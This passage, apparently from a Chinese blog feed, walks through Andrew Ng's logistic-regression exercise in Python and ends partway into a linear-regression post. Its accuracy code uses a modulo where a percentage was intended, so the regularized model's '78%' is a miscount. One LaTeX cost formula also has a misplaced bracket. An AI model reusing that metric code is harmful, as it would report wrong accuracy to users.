class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">positive = data[data[<span class="string">'Admitted'</span>].isin([<span class="number">1</span>])]</span><br><span class="line">negative = data[data[<span class="string">'Admitted'</span>].isin([<span class="number">0</span>])]</span><br><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line"><span class="comment"># 正向类，绘制50个样本，c=‘b’颜色，maker=‘o’绘制的形状</span></span><br><span class="line">ax.scatter(positive[<span class="string">'Exam 1'</span>], positive[<span class="string">'Exam 2'</span>], s=<span class="number">50</span>, c=<span class="string">'b'</span>, marker=<span class="string">'o'</span>, label=<span class="string">'Admitted'</span>)</span><br><span class="line">ax.scatter(negative[<span class="string">'Exam 1'</span>], negative[<span class="string">'Exam 2'</span>], s=<span class="number">50</span>, c=<span class="string">'r'</span>, marker=<span class="string">'x'</span>, label=<span class="string">'Not Admitted'</span>)</span><br><span class="line">ax.legend()<span class="comment"># Legend 图例,获取label标签内容，如图右上角显示</span></span><br><span class="line">ax.set_xlabel(<span class="string">'Exam 1 Score'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'Exam 2 Score'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>如图：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20704logic01.png" alt="png"><br>看起来在两类间，有一个清晰的决策边界。现在我们需要实现逻辑回归，那样就可以训练一个模型来预测结果。方程实现在下面的代码示例在”exercises” 文件夹的 “ex2.pdf” 中。</p><h2 id="sigmoid-函数"><a href="#sigmoid-函数" class="headerlink" title="sigmoid 函数"></a>sigmoid 函数</h2><p>g 代表一个常用的逻辑函数（logistic function）为S形函数（Sigmoid function），公式为：$g(z)=\frac{1}{1+e^{-z}}$<br>合起来，我们得到逻辑回归模型的假设函数：<br>    $h_{\theta}(x)=\frac{1}{1+e^{-\theta^Tx}}$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span><span class="params">(z)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (<span class="number">1</span> + np.exp(-z))</span><br></pre></td></tr></table></figure><p>让我们做一个快速的检查，来确保它可以工作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nums = np.arange(<span class="number">-10</span>, <span class="number">10</span>, step=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line">ax.plot(nums, sigmoid(nums), <span class="string">'r'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20704logic02.png" alt="png"></p><p>棒极了！现在，我们需要编写代价函数来评估结果。<br>代价函数：</p><p>$J(\theta) = \frac{1}{m}\sum_{i=1}^{m}[-y^{(i)}]log(h_{\theta}(x^{(i)}))-(1-y^{(i)})log(1-h_{\theta}(x^{(i)}))]$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(theta, X, y)</span>:</span></span><br><span class="line">    theta = np.matrix(theta)</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    first = np.multiply(-y, np.log(sigmoid(X * theta.T)))</span><br><span class="line">    second = np.multiply((<span class="number">1</span> - y), np.log(<span class="number">1</span> - sigmoid(X * theta.T)))</span><br><span class="line">    <span class="keyword">return</span> np.sum(first - second) / (len(X))</span><br></pre></td></tr></table></figure><p>现在，我们要做一些设置，和我们在练习1在线性回归的练习很相似。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add a ones column - this makes the matrix multiplication work out easier</span></span><br><span class="line">data.insert(<span class="number">0</span>, <span class="string">'Ones'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set X (training data) and y (target variable)</span></span><br><span class="line">cols = data.shape[<span class="number">1</span>]</span><br><span class="line">X = data.iloc[:,<span class="number">0</span>:cols<span class="number">-1</span>]</span><br><span class="line">y = data.iloc[:,cols<span class="number">-1</span>:cols]</span><br><span class="line"></span><br><span class="line"><span class="comment"># convert to numpy arrays and initalize the parameter array theta</span></span><br><span class="line">X = np.array(X.values)</span><br><span class="line">y = np.array(y.values)</span><br><span class="line">theta = np.zeros(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>让我们来检查矩阵的维度来确保一切良好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theta</span><br></pre></td></tr></table></figure><pre><code>array([0., 0., 0.])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X.shape, theta.shape, y.shape</span><br></pre></td></tr></table></figure><pre><code>((100, 3), (3,), (100, 1))</code></pre><p>让我们计算初始化参数的代价函数(theta为0)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cost(theta, X, y)</span><br></pre></td></tr></table></figure><pre><code>0.6931471805599453</code></pre><p>看起来不错，接下来，我们需要一个函数来计算我们的训练数据、标签和一些参数thata的梯度。</p><h2 id="gradient-descent-梯度下降"><a href="#gradient-descent-梯度下降" class="headerlink" title="gradient descent(梯度下降)"></a>gradient descent(梯度下降)</h2><ul><li>这是批量梯度下降（batch gradient descent）  </li><li>转化为向量化计算： $\frac{1}{m} X^T( Sigmoid(X\theta) - y )$</li><li>{% raw %}$$\frac{\partial J( \theta  )}{\partial {\theta }_{j}}=\frac{1}{m}\sum\limits_{i=1}^{m}({{h}_{\theta }}( {x}^{(i)})-{y}^{(i)})x_{j}^{(i)}$$  {% endraw %}</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient</span><span class="params">(theta, X, y)</span>:</span></span><br><span class="line">    theta = np.matrix(theta)</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    parameters = int(theta.ravel().shape[<span class="number">1</span>])</span><br><span class="line">    grad = np.zeros(parameters)</span><br><span class="line">    </span><br><span class="line">    error = sigmoid(X * theta.T) - y</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(parameters):</span><br><span class="line">        term = np.multiply(error, X[:,i])</span><br><span class="line">        grad[i] = np.sum(term) / len(X)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> grad</span><br></pre></td></tr></table></figure><p>注意，我们实际上没有在这个函数中执行梯度下降，我们仅仅在计算一个梯度步长。在练习中，一个称为“fminunc”的Octave函数是用来优化函数来计算成本和梯度参数。由于我们使用Python，我们可以用SciPy的“optimize”命名空间来做同样的事情。</p><p>我们看看用我们的数据和初始参数为0的梯度下降法的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gradient(theta, X, y)</span><br></pre></td></tr></table></figure><pre><code>array([ -0.1       , -12.00921659, -11.26284221])</code></pre><p>现在可以用SciPy’s truncated newton（TNC）实现寻找最优参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scipy.optimize <span class="keyword">as</span> opt</span><br><span class="line">result = opt.fmin_tnc(func=cost, x0=theta, fprime=gradient, args=(X, y))</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>(array([-25.16131872,   0.20623159,   0.20147149]), 36, 0)</code></pre><p>让我们看看在这个结论下代价函数计算结果是什么个样子~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cost(result[<span class="number">0</span>], X, y)</span><br></pre></td></tr></table></figure><pre><code>0.20349770158947425</code></pre><p>接下来，我们需要编写一个函数，用我们所学的参数theta来为数据集X输出预测。然后，我们可以使用这个函数来给我们的分类器的训练精度打分。<br>逻辑回归模型的假设函数： </p><p>$h_{\theta}(x)=\frac{1}{1+e^{-\theta^Tx}}$</p><p>当${h}_{\theta}$大于等于0.5时，预测 y=1</p><p>当${h}_{\theta }$小于0.5时，预测 y=0 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(theta, X)</span>:</span></span><br><span class="line">    probability = sigmoid(X * theta.T)</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1</span> <span class="keyword">if</span> x &gt;= <span class="number">0.5</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> probability]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">theta_min = np.matrix(result[<span class="number">0</span>])</span><br><span class="line">predictions = predict(theta_min, X)</span><br><span class="line">correct = [<span class="number">1</span> <span class="keyword">if</span> ((a == <span class="number">1</span> <span class="keyword">and</span> b == <span class="number">1</span>) <span class="keyword">or</span> (a == <span class="number">0</span> <span class="keyword">and</span> b == <span class="number">0</span>)) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> (a, b) <span class="keyword">in</span> zip(predictions, y)]</span><br><span class="line">accuracy = (sum(map(int, correct)) % len(correct))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'accuracy = &#123;0&#125;%'</span>.format(accuracy))</span><br></pre></td></tr></table></figure><pre><code>accuracy = 89%</code></pre><p>我们的逻辑回归分类器预测正确，如果一个学生被录取或没有录取，达到89%的精确度。不坏！记住，这是训练集的准确性。我们没有保持住了设置或使用交叉验证得到的真实逼近，所以这个数字有可能高于其真实值（这个话题将在以后说明）。</p><h2 id="正则化逻辑回归"><a href="#正则化逻辑回归" class="headerlink" title="正则化逻辑回归"></a>正则化逻辑回归</h2><p>在训练的第二部分，我们将要通过加入正则项提升逻辑回归算法。如果你对正则化有点眼生，或者喜欢这一节的方程的背景，请参考在”exercises”文件夹中的”ex2.pdf”。简而言之，正则化是成本函数中的一个术语，它使算法更倾向于“更简单”的模型（在这种情况下，模型将更小的系数）。这个理论助于减少过拟合，提高模型的泛化能力。这样，我们开始吧。</p><p>设想你是工厂的生产主管，你有一些芯片在两次测试中的测试结果。对于这两次测试，你想决定是否芯片要被接受或抛弃。为了帮助你做出艰难的决定，你拥有过去芯片的测试数据集，从其中你可以构建一个逻辑回归模型。</p><p>和第一部分很像，从数据可视化开始吧！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">path =  <span class="string">'ex2data2.txt'</span></span><br><span class="line">data2 = pd.read_csv(path, header=<span class="literal">None</span>, names=[<span class="string">'Test 1'</span>, <span class="string">'Test 2'</span>, <span class="string">'Accepted'</span>])</span><br><span class="line">data2.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Test 1</th>      <th>Test 2</th>      <th>Accepted</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>0.051267</td>      <td>0.69956</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>-0.092742</td>      <td>0.68494</td>      <td>1</td>    </tr>    <tr>      <td>2</td>      <td>-0.213710</td>      <td>0.69225</td>      <td>1</td>    </tr>    <tr>      <td>3</td>      <td>-0.375000</td>      <td>0.50219</td>      <td>1</td>    </tr>    <tr>      <td>4</td>      <td>-0.513250</td>      <td>0.46564</td>      <td>1</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">positive = data2[data2[<span class="string">'Accepted'</span>].isin([<span class="number">1</span>])]</span><br><span class="line">negative = data2[data2[<span class="string">'Accepted'</span>].isin([<span class="number">0</span>])]</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line">ax.scatter(positive[<span class="string">'Test 1'</span>], positive[<span class="string">'Test 2'</span>], s=<span class="number">50</span>, c=<span class="string">'b'</span>, marker=<span class="string">'o'</span>, label=<span class="string">'Accepted'</span>)</span><br><span class="line">ax.scatter(negative[<span class="string">'Test 1'</span>], negative[<span class="string">'Test 2'</span>], s=<span class="number">50</span>, c=<span class="string">'r'</span>, marker=<span class="string">'x'</span>, label=<span class="string">'Rejected'</span>)</span><br><span class="line">ax.legend()</span><br><span class="line">ax.set_xlabel(<span class="string">'Test 1 Score'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'Test 2 Score'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20704logic03.png" alt="png"></p><p>哇，这个数据看起来可比前一次的复杂得多。特别地，你会注意到其中没有线性决策界限，来良好的分开两类数据。一个方法是用像逻辑回归这样的线性技术来构造从原始特征的多项式中得到的特征。让我们通过创建一组多项式特征入手吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">degree = <span class="number">5</span></span><br><span class="line">x1 = data2[<span class="string">'Test 1'</span>]</span><br><span class="line">x2 = data2[<span class="string">'Test 2'</span>]</span><br><span class="line"></span><br><span class="line">data2.insert(<span class="number">3</span>, <span class="string">'Ones'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, degree):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, i):</span><br><span class="line">        data2[<span class="string">'F'</span> + str(i) + str(j)] = np.power(x1, i-j) * np.power(x2, j)</span><br><span class="line"></span><br><span class="line">data2.drop(<span class="string">'Test 1'</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data2.drop(<span class="string">'Test 2'</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">data2.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Accepted</th>      <th>Ones</th>      <th>F10</th>      <th>F20</th>      <th>F21</th>      <th>F30</th>      <th>F31</th>      <th>F32</th>      <th>F40</th>      <th>F41</th>      <th>F42</th>      <th>F43</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>1</td>      <td>1</td>      <td>0.051267</td>      <td>0.002628</td>      <td>0.035864</td>      <td>0.000135</td>      <td>0.001839</td>      <td>0.025089</td>      <td>0.000007</td>      <td>0.000094</td>      <td>0.001286</td>      <td>0.017551</td>    </tr>    <tr>      <td>1</td>      <td>1</td>      <td>1</td>      <td>-0.092742</td>      <td>0.008601</td>      <td>-0.063523</td>      <td>-0.000798</td>      <td>0.005891</td>      <td>-0.043509</td>      <td>0.000074</td>      <td>-0.000546</td>      <td>0.004035</td>      <td>-0.029801</td>    </tr>    <tr>      <td>2</td>      <td>1</td>      <td>1</td>      <td>-0.213710</td>      <td>0.045672</td>      <td>-0.147941</td>      <td>-0.009761</td>      <td>0.031616</td>      <td>-0.102412</td>      <td>0.002086</td>      <td>-0.006757</td>      <td>0.021886</td>      <td>-0.070895</td>    </tr>    <tr>      <td>3</td>      <td>1</td>      <td>1</td>      <td>-0.375000</td>      <td>0.140625</td>      <td>-0.188321</td>      <td>-0.052734</td>      <td>0.070620</td>      <td>-0.094573</td>      <td>0.019775</td>      <td>-0.026483</td>      <td>0.035465</td>      <td>-0.047494</td>    </tr>    <tr>      <td>4</td>      <td>1</td>      <td>1</td>      <td>-0.513250</td>      <td>0.263426</td>      <td>-0.238990</td>      <td>-0.135203</td>      <td>0.122661</td>      <td>-0.111283</td>      <td>0.069393</td>      <td>-0.062956</td>      <td>0.057116</td>      <td>-0.051818</td>    </tr>  </tbody></table></div><p>现在，我们需要修改第1部分的成本和梯度函数，包括正则化项。首先是成本函数：</p><h2 id="regularized-cost（正则化代价函数）"><a href="#regularized-cost（正则化代价函数）" class="headerlink" title="regularized cost（正则化代价函数）"></a>regularized cost（正则化代价函数）</h2>$$J\left( \theta  \right)=\frac{1}{m}\sum\limits_{i=1}^{m}{[-{{y}^{(i)}}\log \left( {{h}_{\theta }}\left( {{x}^{(i)}} \right) \right)-\left( 1-{{y}^{(i)}} \right)\log \left( 1-{{h}_{\theta }}\left( {{x}^{(i)}} \right) \right)]}+\frac{\lambda }{2m}\sum\limits_{j=1}^{n}{\theta _{j}^{2}}$$<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">costReg</span><span class="params">(theta, X, y, learningRate)</span>:</span></span><br><span class="line">    theta = np.matrix(theta)</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    first = np.multiply(-y, np.log(sigmoid(X * theta.T)))</span><br><span class="line">    second = np.multiply((<span class="number">1</span> - y), np.log(<span class="number">1</span> - sigmoid(X * theta.T)))</span><br><span class="line">    reg = (learningRate / (<span class="number">2</span> * len(X))) * np.sum(np.power(theta[:,<span class="number">1</span>:theta.shape[<span class="number">1</span>]], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> np.sum(first - second) / len(X) + reg</span><br></pre></td></tr></table></figure><p>请注意等式中的”reg” 项。还注意到另外的一个“学习率”参数。这是一种超参数，用来控制正则化项。现在我们需要添加正则化梯度函数：</p><p>如果我们要使用梯度下降法令这个代价函数最小化，因为我们未对${\theta }_{0}$ 进行正则化，所以梯度下降算法将分两种情形：</p>$Repeat$  $until$  $convergence${​                                                   ${\theta_0}:={\theta_0}-a\frac{1}{m}\sum\limits_{i=1}^{m}{(({h_\theta}({{x}^{(i)}})-{{y}^{(i)}})x_{0}^{(i)}})$​                                                  ${\theta_j}:={\theta_j}-a[\frac{1}{m}\sum\limits_{i=1}^{m}{({h_\theta}({{x}^{(i)}})-{{y}^{(i)}})x_{j}^{\left( i \right)}}+\frac{\lambda }{m}{\theta_j}]$​                                                 $for$ $j=1,2,...n$​                                                 }<p>对上面的算法中 j=1,2,…,n 时的更新式子进行调整可得：</p> ${{\theta }_{j}}:={{\theta }_{j}}(1-a\frac{\lambda }{m})-a\frac{1}{m}\sum\limits_{i=1}^{m}{({{h}_{\theta }}\left( {{x}^{(i)}} \right)-{{y}^{(i)}})x_{j}^{(i)}}$<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradientReg</span><span class="params">(theta, X, y, learningRate)</span>:</span></span><br><span class="line">    theta = np.matrix(theta)</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    parameters = int(theta.ravel().shape[<span class="number">1</span>])</span><br><span class="line">    grad = np.zeros(parameters)</span><br><span class="line">    </span><br><span class="line">    error = sigmoid(X * theta.T) - y</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(parameters):</span><br><span class="line">        term = np.multiply(error, X[:,i])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>):</span><br><span class="line">            grad[i] = np.sum(term) / len(X)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            grad[i] = (np.sum(term) / len(X)) + ((learningRate / len(X)) * theta[:,i])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> grad</span><br></pre></td></tr></table></figure><p>就像在第一部分中做的一样，初始化变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set X and y (remember from above that we moved the label to column 0)</span></span><br><span class="line">cols = data2.shape[<span class="number">1</span>]</span><br><span class="line">X2 = data2.iloc[:,<span class="number">1</span>:cols]</span><br><span class="line">y2 = data2.iloc[:,<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># convert to numpy arrays and initalize the parameter array theta</span></span><br><span class="line">X2 = np.array(X2.values)</span><br><span class="line">y2 = np.array(y2.values)</span><br><span class="line">theta2 = np.zeros(<span class="number">11</span>)</span><br></pre></td></tr></table></figure><p>让我们初始学习率到一个合理值。，果有必要的话（即如果惩罚太强或不够强）,我们可以之后再折腾这个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">learningRate = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>现在，让我们尝试调用新的默认为0的theta的正则化函数，以确保计算工作正常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">costReg(theta2, X2, y2, learningRate)</span><br></pre></td></tr></table></figure><pre><code>0.6931471805599454</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gradientReg(theta2, X2, y2, learningRate)</span><br></pre></td></tr></table></figure><pre><code>array([0.00847458, 0.01878809, 0.05034464, 0.01150133, 0.01835599,       0.00732393, 0.00819244, 0.03934862, 0.00223924, 0.01286005,       0.00309594])</code></pre><p>现在我们可以使用和第一部分相同的优化函数来计算优化后的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result2 = opt.fmin_tnc(func=costReg, x0=theta2, fprime=gradientReg, args=(X2, y2, learningRate))</span><br><span class="line">result2</span><br></pre></td></tr></table></figure><pre><code>(array([ 0.53010249,  0.29075567, -1.60725764, -0.5821382 ,  0.01781027,        -0.21329508, -0.40024142, -1.37144139,  0.02264303, -0.9503358 ,         0.0344085 ]), 22, 1)</code></pre><p>最后，我们可以使用第1部分中的预测函数来查看我们的方案在训练数据上的准确度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">theta_min = np.matrix(result2[<span class="number">0</span>])</span><br><span class="line">predictions = predict(theta_min, X2)</span><br><span class="line">correct = [<span class="number">1</span> <span class="keyword">if</span> ((a == <span class="number">1</span> <span class="keyword">and</span> b == <span class="number">1</span>) <span class="keyword">or</span> (a == <span class="number">0</span> <span class="keyword">and</span> b == <span class="number">0</span>)) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> (a, b) <span class="keyword">in</span> zip(predictions, y2)]</span><br><span class="line">accuracy = (sum(map(int, correct)) % len(correct))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'accuracy = &#123;0&#125;%'</span>.format(accuracy))</span><br></pre></td></tr></table></figure><pre><code>accuracy = 78%</code></pre><p>虽然我们实现了这些算法，值得注意的是，我们还可以使用高级Python库像scikit-learn来解决这个问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model<span class="comment">#调用sklearn的线性回归包</span></span><br><span class="line">model = linear_model.LogisticRegression(penalty=<span class="string">'l2'</span>, C=<span class="number">1.0</span>)</span><br><span class="line">model.fit(X2, y2.ravel())</span><br></pre></td></tr></table></figure><pre><code>LogisticRegression(C=1.0, class_weight=None, dual=False, fit_intercept=True,                   intercept_scaling=1, l1_ratio=None, max_iter=100,                   multi_class=&apos;warn&apos;, n_jobs=None, penalty=&apos;l2&apos;,                   random_state=None, solver=&apos;warn&apos;, tol=0.0001, verbose=0,                   warm_start=False)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.score(X2, y2)</span><br></pre></td></tr></table></figure><pre><code>0.6610169491525424</code></pre><p>这个准确度和我们刚刚实现的差了好多，不过请记住这个结果可以使用默认参数下计算的结果。我们可能需要做一些参数的调整来获得和我们之前结果相同的精确度。</p><p>这就是练习2的全部！ 敬请期待下一个练习：多类图像分类。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 逻辑回归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【吴恩达机器学习】练习1-线性回归</title>
      <link href="2020/06/10/ML-001%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92-Exercise1/"/>
      <url>2020/06/10/ML-001%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92-Exercise1/</url>
      
        <content type="html"><![CDATA[<p>本文主要是：通过练习，了解线性回归原理以及 代价函数、梯度下降相关理解</p><a id="more"></a><p>作业内容在根目录： <a href="ex1.pdf">作业文件</a></p><h2 id="单变量线性回归"><a href="#单变量线性回归" class="headerlink" title="单变量线性回归"></a>单变量线性回归</h2><ul><li>导入相关包</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure><ul><li>读取数据并赋予列名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path =  <span class="string">'ex1data1.txt'</span></span><br><span class="line">data = pd.read_csv(path, header=<span class="literal">None</span>, names=[<span class="string">'Population'</span>, <span class="string">'Profit'</span>])</span><br></pre></td></tr></table></figure><ul><li>查看前五行</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Population</th>      <th>Profit</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      